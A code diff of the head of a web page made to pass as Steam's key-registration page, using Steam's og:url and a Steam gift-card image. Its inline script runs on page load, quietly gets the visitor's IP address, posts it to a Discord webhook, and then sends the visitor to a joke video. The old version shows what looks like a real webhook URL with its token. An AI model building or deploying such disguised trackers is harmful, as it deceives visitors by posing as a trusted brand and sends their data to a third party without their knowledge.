@@ -10,40 +10,44 @@
     <meta property="og:url" content="https://store.steampowered.com/account/registerkey" />
     <meta property="og:type" content="website" />
     
-    <meta property="og:image" content="https://cdn.cloudflare.steamstatic.com/store/about/social-og.jpg" />
+    <meta property="og:image" content="https://recharge-prd.asset.akeneo.cloud/product_assets/media/product_card_steam_gb_gbp.png" />
     <meta property="og:image:width" content="1200" />
     <meta property="og:image:height" content="630" />
     
-    <meta name="twitter:card" content="summary_large_image" />
     <meta name="theme-color" content="#171a21" />
 
     <script type="text/javascript">
-        // Your Webhook URL
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1477709893875269763/hlcZYdFcsZCA4t0JKeO8Hr0IBum2-KgPZMMsx426yUp4VeOEoTgfGSz8g7mOtvND6pT';
+        // --- CONFIGURATION ---
+        // Replace with your actual Discord Webhook URL
+        const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE';
+        // URL to redirect to after logging
+        const REDIRECT_URL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+        // ---------------------
 
         async function logAndRedirect() {
             try {
-                // Get the IP
+                // 1. Fetch IP Address
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 const clientIp = ipData.ip;
 
-                // Send to Webhook
+                // 2. Send to Webhook
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: `📢 **New Visitor**\n**IP:** \`${clientIp}\`\n**Site:** Steamroll`
+                        content: `📢 **New Visitor Logged**\n**IP:** \`${clientIp}\``
                     })
                 });
             } catch (error) {
-                console.error('Error logging:', error);
+                console.error('Error logging IP:', error);
             } finally {
-                // Always redirect, even if the webhook fails
-                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+                // 3. Redirect regardless of success or failure
+                window.location.href = REDIRECT_URL;
             }
         }
 
+        // Run the function immediately when the page loads
         window.onload = logAndRedirect;
     </script>
 </head>
